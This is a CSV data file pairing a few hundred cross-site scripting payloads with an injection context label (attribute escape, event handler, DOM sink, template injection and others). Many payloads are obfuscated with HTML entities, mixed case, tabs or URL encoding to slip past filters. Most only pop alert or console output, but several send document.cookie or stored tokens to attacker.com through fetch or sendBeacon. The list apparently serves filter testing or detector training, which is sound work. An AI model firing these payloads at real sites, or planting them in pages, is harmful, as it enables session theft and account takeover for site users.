payload,context
<%= confirm(docum&#101;nt.cooki&#101;) %>,template_injection
\' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)//,attribute_escape
"setTimeout(""alert(btoa(document.cookie))"",0)",dom_sink
<scr	ipt>Function('confirm(document.domain)')();</scr	ipt>,script_injection
' ><svG oNdrOp=ConFirM(lOcaTioN.hAsh)>,attribute_escape
"EvaL(""XMLHttPReQueSt('XSS')"")",dom_sink
JavAscRipT:pRomPt/*x*/(1),js_uri
"<script>/x/console.log(String.fromCharCode(88,83,83))</script>",script_injection
"%27 onload=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
 onPoiNteRraWupDatE=aLerT('XSS'),event_handler
"' ><svg onpointermove=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
OnmOusEovEr=ConFirM/**/(1),event_handler
""" oNbeForEmaTch=coNfiRm(LocAtiOn.HasH) """,attribute_escape
javascr	ipt:prompt/***/(1),js_uri
"JAVASCRIPT:alert(String.fromCharCode(88,83,83))",js_uri
'><img src=x onk&#101;ypr&#101;ss=confirm('XSS')>,attribute_escape
""" ><svG oNkeYprEss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
\%27 onpagehide=alert(document.domain)//,attribute_escape
<ifr&#97;m&#101;/ons&#101;curitypolicyviol&#97;tion=confirm('XSS')>,tag_injection
"<&#97;udio
onpl&#97;y=consol&#101;.log(1)>",tag_injection
onmozfullscreenchange=prompt&#40;'XSS'&#41;,event_handler
"setTimeout(%22alert(document.cookie)%22,0)",dom_sink
'><script>&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
%3Cembed onmozfullscreenchange=confirm(location.hash)/%3E,tag_injection
"document.write(""%3Cimg src=x onerror=eval(document.cookie)%3E"")",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onvolum&#101;ch&#97;ng&#101;"":prompt})",dom_sink
"__proto__[""onpopst&#97;t&#101;""]=confirm(loc&#97;tion.h&#97;sh)",dom_sink
' ><svG oNpaGesHow=coNsoLe.Log('XSS')>,attribute_escape
{{aLerT|cOnsTruCtoR:1}},template_injection
<!--><BodY oNbeForEcuT=cOnfIrm(doCumEnt.doMaiN)>,tag_injection
' on&#101;nd&#101;d=prompt('XSS') ',attribute_escape
<script>/*/\u0061lert('XSS')</script>,script_injection
<&#97;nim&#97;t&#101;tr&#97;nsform onpoint&#101;rdown=prompt(1)/>,tag_injection
"""><img src=x onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
`%3E%3Cimg src=x onkeydown=prompt('XSS')%3E,attribute_escape
%22 oninvalid=confirm(1) %22,attribute_escape
"\"" onmouseover=prompt(document.domain)//",attribute_escape
"' onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
j&#97;v&#97;	script:&#97;l&#101;rt(1),js_uri
\%22 onanimationend=confirm(document.domain)//,attribute_escape
<button	onclick=console.log(1)>,tag_injection
<di&#97;log	onpoint&#101;rov&#101;r=confirm(1)>,tag_injection
\%27 onscrollsnapchange=prompt(location.hash)//,attribute_escape
ondr&#97;gov&#101;r=j&#97;v&#97;script:prompt('XSS'),event_handler
"%27 onreset=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
<b&#97;s&#101; src=x onp&#97;g&#101;sw&#97;p=&#97;l&#101;rt('XSS')>,tag_injection
"""%3E%3Ctable onselect=prompt(1)%3E",tag_injection
"Obj&#101;ct.&#97;ssign(window,{""on&#101;rror"":XMLHttpR&#101;qu&#101;st})",dom_sink
%3Cmeta ontransitionstart=alert(location.hash)/%3E,tag_injection
onbegin=console.log&#40;'XSS'&#41;,event_handler
	onchange=\u0061lert(document.domain),event_handler
onmouseup=console.log('XSS'),event_handler
	onscroll&#101;nd=confirm(1),event_handler
"\"" onmous&#101;up=prompt(docum&#101;nt.dom&#97;in)//",attribute_escape
	onDraGovEr=ProMpt(doCumEnt.doMaiN),event_handler
"Object.assign(window,{""ondrop"":console.log})",dom_sink
`><img src=x onpointermove=alert(document.domain)>,attribute_escape
"""><&#97;nim&#97;t&#101;motion ong&#101;stur&#101;st&#97;rt=confirm(1)>",tag_injection
"%22 ><svg onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape
__${&#97;l&#101;rt(docum&#101;nt.dom&#97;in)}__::.x,template_injection
\' onmouseover=console.log('XSS')//,attribute_escape
"<maRquEe
OnbEfoRetOggLe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"\"" onw&#101;bkit&#97;nim&#97;tion&#101;nd=confirm('XSS')//",attribute_escape
"location=""javascr	ipt:console.log(String.fromCharCode(88,83,83))""",dom_sink
' oNblUr=ConSolE.lOg(DocUmeNt.DomAin) ',attribute_escape
\' OnaNimAtiOncAncEl=ProMpt(loCatIon.haSh)//,attribute_escape
"<taBle
onSelEct=coNfiRm(DocUmeNt.DomAin)>",tag_injection
'%3E%3Cimg src=x ontransitionend=confirm('XSS')%3E,attribute_escape
""" ><svg onload=console.log(1)>",attribute_escape
"__pRotO__[""oNpoIntErmOve""]=ConSolE.lOg(BtoA(dOcuMenT.cOokIe))",dom_sink
<animatemotion ondrop=confirm(location.hash)/>,tag_injection
<table	oninvalid=prompt('XSS')>,tag_injection
"""><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape
\%27 onmousedown=confirm(1)//,attribute_escape
"""><Img srC=x onTraNsiTioNenD=aLerT(1)>",attribute_escape
"\"" on&#101;nd=prompt(loc&#97;tion.h&#97;sh)//",attribute_escape
' oNpaGehIde=coNfiRm(1) ',attribute_escape
<listing	onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS')>,tag_injection
%27 ><svg onpointermove=prompt(location.hash)>,attribute_escape
"%27 onanimationcancel=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
"	onr&#101;p&#101;&#97;t=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""feTch(loCalStoRagE.gEtITem('tOkeN'))""",dom_sink
onblur=javascript:alert(document.domain),event_handler
"`><img src=x onended=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
"' ><svg onclose=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=alert(btoa(document.cookie))%3E"")",dom_sink
""" onmous&#101;wh&#101;&#101;l=consol&#101;.log(1) """,attribute_escape
' ontouchmove=\u0061lert(location.hash) ',attribute_escape
""" ><svg onwebkitfullscreenchange=\u0061lert('XSS')>",attribute_escape
"location=""javascript:XMLHttpRequest(location.hash)""",dom_sink
"\"" onended=console.log(document.domain)//",attribute_escape
<!--><&#97;nim&#97;t&#101; onp&#97;g&#101;show=consol&#101;.log('XSS')>,tag_injection
"\"" ondragover=console.log(String.fromCharCode(88,83,83))//",attribute_escape
document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(document.domain)%22,dom_sink
"<m&#97;rqu&#101;&#101;
onk&#101;ydown=confirm(1)>",tag_injection
<t&#101;mpl&#97;t&#101; ons&#101;&#97;rch=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
 onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in),event_handler
[#prompt document.cookie /],template_injection
"""><&#97;udio onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
&quOt; onPagEshOw=ConSolE.lOg('XSS') x=&quOt;,attribute_escape
%27 ><svg onpopstate=alert(location.hash)>,attribute_escape
' ><svG oNpaGerEveAl=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape
&quot; onpointerrawupdate=prompt(%27XSS%27) x=&quot;,attribute_escape
`%3E%3Cimg src=x onpointermove=alert(document.domain)%3E,attribute_escape
"""%3E%3Cimg src=x onmouseover=prompt(document.domain)%3E",attribute_escape
	onpageswap=console.log(location.hash),event_handler
__proto__[%22onplay%22]=fetch(btoa(document.cookie)),dom_sink
"""><base oninput=alert('XSS')>",tag_injection
\' onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape
""" oNbeForEmaTch=coNfiRm(1) """,attribute_escape
""" %3E%3Csvg onwebkitfullscreenchange=alert('XSS')%3E",attribute_escape
__proto__[%22oncontextmenu%22]=prompt(%27//attacker.com/?c=%27+document.cookie),dom_sink
`><Img srC=x onWheEl=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape
"""><img src=x onfocusout=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"%3Ctr
ontoggle=console.log(document.domain)%3E",tag_injection
<template onsearch=console.log(document.domain)/>,tag_injection
<tr onpointerrawupdate=alert(location.hash) onpointerrawupdate=alert(location.hash)>,tag_injection
"%3Carea
onpageshow=prompt('XSS')%3E",tag_injection
' %3E%3Csvg onpagehide=alert(document.domain)%3E,attribute_escape
onfocusin=confirm/**/(docum&#101;nt.dom&#97;in),event_handler
{coNfiRm 1},template_injection
"Obj&#101;ct.&#97;ssign(window,{""oncopy"":f&#101;tch})",dom_sink
"<baSe
OntOucHmoVe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"`><img src=x onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"\"" onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape
"""><img src=x onplay=confirm('XSS')>",attribute_escape
document.write(%22<img src=x onerror=confirm(document.cookie)>%22),dom_sink
OnpAgeSwaP=cOnsOle.loG(lOcaTioN.hAsh),event_handler
' onlo&#97;d=&#97;l&#101;rt(1) ',attribute_escape
"'><Img srC=x onTogGle=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
&quOt; onTouCheNd=ConFirM('XSS') X=&QuoT;,attribute_escape
"LocAtiOn=""jaVasCriPt:EvaL(dOcuMenT.dOmaIn)""",dom_sink
"__pRotO__[""oNtoUchEnd""]=FetCh(DocUmeNt.CooKie)",dom_sink
"onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"""%3E%3Cimg src=x ongotpointercapture=confirm(location.hash)%3E",attribute_escape
&quot; ontr&#97;nsitionrun=consol&#101;.log('XSS') x=&quot;,attribute_escape
' %3E%3Csvg onpageshow=prompt(document.domain)%3E,attribute_escape
"""><AniMatE oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg(1)>",tag_injection
<plAinTexT sRc=X oNpaGerEveAl=AleRt(LocAtiOn.HasH)>,tag_injection
<mtExt	onFocUsoUt=ConFirM(lOcaTioN.hAsh)>,tag_injection
<s&#101;l&#101;ct src=x onpromptdismiss=consol&#101;.log(1)>,tag_injection
"""><ForM oNseArcH=cOnsOle.loG(1)>",tag_injection
<body/onclose=console.log('XSS')>,tag_injection
""" onpointerrawupdate=\u0061lert('XSS') """,attribute_escape
""" oNpaGehIde=coNfiRm(1) """,attribute_escape
"""><img src=x onpopstate=alert(document.domain)>",attribute_escape
"\' on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
onmousedown=javascript:console.log('XSS'),event_handler
<ifRamE x=y OnsEcuRitYpoLicYviOlaTioN=cOnfIrm('XSS')>,tag_injection
"""%3E%3Cscript%3Eprompt(document.domain)%3C/script%3E",script_injection
ontouchend=javascr	ipt:alert(location.hash),event_handler
<auDio	onPauSe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
"""><img src=x onb&#101;gin=confirm(1)>",attribute_escape
"\' ontr&#97;nsitionrun=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
<imG	oNkeYprEss=coNsoLe.Log(1)>,tag_injection
"""><BasE oNinPut=alErt('XSS')>",tag_injection
%27 onmousewheel=alert(document.domain) %27,attribute_escape
"__proto__[%22onreset%22]=fetch(String.fromCharCode(88,83,83))",dom_sink
"`><img src=x ondblclick=console.log(String.fromCharCode(88,83,83))>",attribute_escape
JavA	sCriPt:ConSolE.lOg('XSS'),js_uri
"&quot; onpromptaction=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
"&quot; ontransitionrun=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
"__pRotO__[""oNinValId""]=XMLHTtpReqUesT(bToa(doCumEnt.coOkiE))",dom_sink
' ><svG oNenDed=prOmpT(dOcuMenT.dOmaIn)>,attribute_escape
	onplaying=alert(1),event_handler
<taBle/onSelEct=prOmpT(1)>,tag_injection
"document.querySelector(""body"").innerHTML+=""eval(btoa(document.cookie))""",dom_sink
<!--><PlaIntExt onTouChsTarT=aLerT(1)>,tag_injection
""" onpointerup=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"<math
onplaying=console.log('XSS')>",tag_injection
"""><BodY oNpoIntErmOve=alErt(loCatIon.haSh)>",tag_injection
' %3E%3Csvg onended=alert(1)%3E,attribute_escape
'><img src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape
<form onpagereveal=console.log(location.hash)/>,tag_injection
"<scr	ipt>setTimeout('confirm('XSS')',0)</scr	ipt>",script_injection
"(neW FUncTioN(""ConSolE.lOg(1)""))();",dom_sink
"""><img src=x onlo&#97;d=&#97;l&#101;rt(1)>",attribute_escape
%22 ><svg oncut=alert(%27XSS%27)>,attribute_escape
<base onpageswap=alert(%27XSS%27) onpageswap=alert(%27XSS%27)>,tag_injection
"<liNk
OnwAitIng=coNfiRm(1)>",tag_injection
<baSe Src=x OnpOinTerUp=AleRt(LocAtiOn.HasH)>,tag_injection
"${{'prompt('XSS')'.replace('prompt('XSS')','')}}",template_injection
"__proto__[%22ontouchend%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
"%27 ><svg onanimationend=confirm(String.fromCharCode(88,83,83))>",attribute_escape
%27 ><svg onbeforecut=confirm(1)>,attribute_escape
<link onwaiting=confirm(1) onwaiting=confirm(1)>,tag_injection
\' OnbEfoRepAstE=cOnfIrm(doCumEnt.doMaiN)//,attribute_escape
"document.body.innerHTML=""<img src=x onerror=prompt('//attacker.com/?c='+document.cookie)>""",dom_sink
"__proto__[""ons&#101;curitypolicyviol&#97;tion""]=confirm(loc&#97;tion.h&#97;sh)",dom_sink
	onbeforetoggle=\u0061lert(location.hash),event_handler
%27 onwheel=prompt(location.hash) %27,attribute_escape
"document.write(""%3Cimg src=x onerror=confirm(String.fromCharCode(88,83,83))%3E"")",dom_sink
OncHanGe=AleRt/***/(dOcuMenT.dOmaIn),event_handler
<scr	ipt>//console.log(1)</scr	ipt>,script_injection
"""><Img srC=x onPoiNteRcaNceL=cOnsOle.loG(dOcuMenT.dOmaIn)>",attribute_escape
<s&#101;t on&#101;nd=&#97;l&#101;rt(1)>,tag_injection
\' oncont&#101;xtm&#101;nu=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//,attribute_escape
"""><table ontouchend=prompt(document.domain)>",tag_injection
location=%22javascript:alert(1)%22,dom_sink
"'><Img srC=x onBegIn=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
\' oncopy=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape
onpointercancel=javascript:prompt(location.hash),event_handler
OnsEleCt=JavAscRipT:pRomPt(LocAtiOn.HasH),event_handler
<script>//confirm(1)</script>,script_injection
onmous&#101;up=consol&#101;.log('XSS'),event_handler
javascr	ipt:alert/***/('XSS'),js_uri
"__pRotO__[""oNenDed""]=ConSolE.lOg('XSS')",dom_sink
"Object.assign(window,{""onpointerdown"":fetch})",dom_sink
""" ontouchst&#97;rt=consol&#101;.log(1) """,attribute_escape
<tr src=x onanimationend=prompt('XSS')>,tag_injection
ongotpoint&#101;rc&#97;ptur&#101;=prompt/**/(loc&#97;tion.h&#97;sh),event_handler
%22 onfocus=confirm(document.domain) autofocus=%22,attribute_escape
OncAnpLay=coNsoLe.Log('XSS'),event_handler
"javascr	ipt:console.log(String.fromCharCode(88,83,83))",js_uri
%3C%= alert 'XSS' %%3E,template_injection
"__pRotO__[""oNmoZfuLlsCreEncHanGe""]=aLerT('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)",dom_sink
"&#101;v&#97;l(""&#97;l&#101;rt('XSS')"")",dom_sink
`><Img srC=x onCopY=cOnfIrm(loCatIon.haSh)>,attribute_escape
<animatemotion src=x ondrop=confirm(location.hash)>,tag_injection
"(neW FUncTioN(""AleRt(StrIng.frOmCHarCodE(88,83,83))""))();",dom_sink
' ongesturestart=alert(1) ',attribute_escape
`><Img srC=x onKeyDowN=aLerT(lOcaTioN.hAsh)>,attribute_escape
&quot; ontouchend=confirm(%27XSS%27) x=&quot;,attribute_escape
"`><img src=x ongotpointercapture=prompt(String.fromCharCode(88,83,83))>",attribute_escape
document.body.innerHTML=%22<img src=x onerror=console.log(localStorage.getItem(%27token%27))>%22,dom_sink
"""><td onstalled=confirm('XSS')>",tag_injection
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""feTch(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))""",dom_sink
onfocusin=prompt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
%3Ctitle	onstalled=alert('XSS')%3E,tag_injection
<&#97;udio src=x oninput=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNhaShcHanGe"":XMLHtTpREquEst})",dom_sink
"%3Cmarquee onbeforetoggle=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
	onkeydown=confirm('XSS'),event_handler
"<scRipT>FUncTioN('AleRt(StrIng.frOmCHarCodE(88,83,83))')();</scRipT>",script_injection
onclos&#101;=consol&#101;.log/*x*/('XSS'),event_handler
' ondrop=confirm(location.hash) ',attribute_escape
<&#97;nim&#97;t&#101;motion ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS') ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS')>,tag_injection
onmouseenter=alert(%27XSS%27),event_handler
ons&#101;&#97;rch=consol&#101;.log/**/('XSS'),event_handler
""" ><svg ongotpointercapture=alert(document.domain)>",attribute_escape
<!--><object onvolumechange=alert(1)>,tag_injection
"' onscrollsn&#97;pch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
' ><svg ontouchmov&#101;=consol&#101;.log('XSS')>,attribute_escape
""" %3E%3Csvg onpagehide=prompt('XSS')%3E",attribute_escape
JAVASCRIPT:consol&#101;.log(loc&#97;tion.h&#97;sh),js_uri
&#106;avascr	ipt:confirm(document.domain),js_uri
"DatA:tExt/htMl,<scRipT>pRomPt('XSS')</sCriPt>",js_uri
onblur=j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
`><img src=x onerror=\u0061lert(1)>,attribute_escape
"__proto__[""oncopy""]=&#97;l&#101;rt(1)",dom_sink
<div onp&#97;us&#101;=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
<spAn Src=x OnbEfoRetOggLe=ProMpt(loCatIon.haSh)>,tag_injection
onauxclick=confirm/**/(document.domain),event_handler
%3Cembed onmozfullscreenchange=confirm(location.hash) onmozfullscreenchange=confirm(location.hash)%3E,tag_injection
"window[""alert""](String.fromCharCode(88,83,83))",dom_sink
<t&#101;mpl&#97;t&#101; onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
"&quot; onp&#97;g&#101;sw&#97;p=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"java
script:confirm(document.domain)",js_uri
' ><svG oNcoPy=ConFirM('XSS')>,attribute_escape
"s&#101;tInt&#101;rv&#97;l(""consol&#101;.log(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",100)",dom_sink
<meta/ondrop=alert(document.domain)>,tag_injection
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""XMLHtTpREquEst('XSS')""",dom_sink
"onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"<obJecT
oNbeForEpaSte=coNfiRm(DocUmeNt.DomAin)>",tag_injection
' %3E%3Csvg onpopstate=alert(1)%3E,attribute_escape
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""XMLHttpR&#101;qu&#101;st(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"")",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onpromptdismiss"":f&#101;tch})",dom_sink
""" oNfoCus=coNsoLe.Log(1) """,attribute_escape
on&#101;rror=consol&#101;.log/**/('XSS'),event_handler
<script>console.log`document.domain`</script>,script_injection
<seT oNcaNplAy=ConFirM(1) oNcaNplAy=ConFirM(1)>,tag_injection
%3Cmath onpromptaction=prompt(1) onpromptaction=prompt(1)%3E,tag_injection
`><img src=x oncontextmenu=alert(1)>,attribute_escape
"(n&#101;w Function(""&#97;l&#101;rt(docum&#101;nt.dom&#97;in)""))();",dom_sink
<script>prompt`%27XSS%27`</script>,script_injection
`><img src=x onw&#101;bkittr&#97;nsition&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"' ><svG oNkeYprEss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"""%3E%3Cimg src=x onfocusout=confirm(location.hash)%3E",attribute_escape
"""><img src=x ondragenter=console.log(1)>",attribute_escape
"<viDeo
onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"OnfUllScrEenChaNge=alErt&#40;STriNg.FroMChArCOde(88,83,83)&#41;",event_handler
"%22><img src=x onscrollend=alert(String.fromCharCode(88,83,83))>",attribute_escape
"__proto__[""onr&#101;p&#101;&#97;t""]=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
[#aLerT dOcuMenT.cOokIe /],template_injection
""" onfocus=consol&#101;.log('XSS') &#97;utofocus=""",attribute_escape
' ><svG oNmoUseDowN=cOnfIrm(doCumEnt.doMaiN)>,attribute_escape
<SCRIPT>consol&#101;.log(docum&#101;nt.dom&#97;in)</SCRIPT>,script_injection
<im&#97;g&#101; src=x onch&#97;ng&#101;=&#97;l&#101;rt(1)>,tag_injection
"SetIntErvAl(""coNsoLe.Log(btOa(DocUmeNt.CooKie))"",100)",dom_sink
""" onb&#101;for&#101;toggl&#101;=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
OnpAstE=jAvaScrIpt:coNfiRm(DocUmeNt.DomAin),event_handler
"%22><img src=x onplay=prompt(String.fromCharCode(88,83,83))>",attribute_escape
<t&#101;mpl&#97;t&#101;/on&#101;nd&#101;d=prompt('XSS')>,tag_injection
location=%22javascript:fetch(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink
